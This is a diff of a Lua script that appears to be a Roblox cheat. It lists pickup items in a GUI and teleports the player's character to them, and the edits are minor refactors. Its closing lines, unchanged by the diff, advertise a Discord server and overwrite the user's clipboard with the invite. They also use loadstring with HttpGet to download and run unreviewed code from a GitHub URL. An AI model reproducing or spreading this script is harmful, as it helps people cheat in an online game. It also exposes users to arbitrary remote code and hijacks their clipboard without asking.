@@ -45,6 +45,8 @@ UIS.InputChanged:Connect(function(input)
 end)
 
 local function createItemFrame(item)
+    if frameCache[item] then return end
+
     local itemPos = item.Position
     local ItemFrame = Instance.new("TextButton")
     ItemFrame.Parent = ScrollingFrame
@@ -77,6 +79,7 @@ local function createItemFrame(item)
             player.Character.HumanoidRootPart.CFrame = originalPos
         end
     end)
+
     frameCache[item] = ItemFrame
     local function update()
         ItemFrame.Visible = item.Transparency < 1
@@ -98,16 +101,16 @@ end
 local function onItemAdded(item)
     local hasClickDetector = item.Parent:FindFirstChild("ClickDetector")
     local hasClickEvent = item.Parent:FindFirstChild("ClickEvent")
-    if (item.Name == "ItemPickupScript" or item.Name == "NewItemPickupScript") or 
+    if (item.Name == "ItemPickupScript" or item.Name == "NewItemPickupScript" and hasClickDetector) or 
        (hasClickDetector or hasClickEvent) and 
        not itemCache[item.Parent] then
         itemCache[item.Parent] = true
-        createItemFrame(item.Parent)
+        task.defer(function() createItemFrame(item.Parent) end)
     end
 end
 
 local function onItemRemoved(item)
-    if itemCache[item.Parent] and frameCache[item.Parent] then
+    if frameCache[item.Parent] then
         frameCache[item.Parent]:Destroy()
         itemCache[item.Parent], frameCache[item.Parent] = nil, nil
     end
@@ -121,9 +124,9 @@ for _, item in pairs(Workspace:GetDescendants()) do
 end
 
 game:GetService("StarterGui"):SetCore("SendNotification",{
-	Title = "https://discord.gg/R2dbGKyqqE",
-	Text = "Join our community!",
-	Duration = 25;
+    Title = "https://discord.gg/R2dbGKyqqE",
+    Text = "Join our community!",
+    Duration = 25;
 })
 loadstring(game:HttpGet("https://raw.githubusercontent.com/BaconBABA/script/refs/heads/main/web.lua"))()
 setclipboard("https://discord.gg/R2dbGKyqqE")
